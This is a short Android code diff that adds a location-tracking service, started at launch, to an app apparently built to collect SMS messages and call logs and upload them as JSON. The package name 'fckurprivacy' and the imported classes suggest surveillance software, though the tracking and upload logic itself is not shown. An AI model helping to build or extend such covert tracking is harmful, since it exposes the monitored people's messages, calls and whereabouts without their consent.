@@ -22,6 +22,7 @@ import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsObserver;
 import com.vergermiya.harevost.fckurprivacy.Util.AccessibilityChecker;
 import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;
 import com.vergermiya.harevost.fckurprivacy.Util.JsonUploader;
+import com.vergermiya.harevost.fckurprivacy.locationChecker.LocationService;
 
 import java.util.ArrayList;
 
@@ -97,6 +98,9 @@ public class MainActivity extends AppCompatActivity {
         Intent smsIntent = new Intent();
         smsIntent.setClass(this, SmsCheckService.class);
         startService(smsIntent);
+
+        Intent locService = new Intent(MainActivity.this, LocationService.class);
+        startService(locService);
 
         getCallLogsButton.setOnClickListener(new View.OnClickListener() {
             @Override
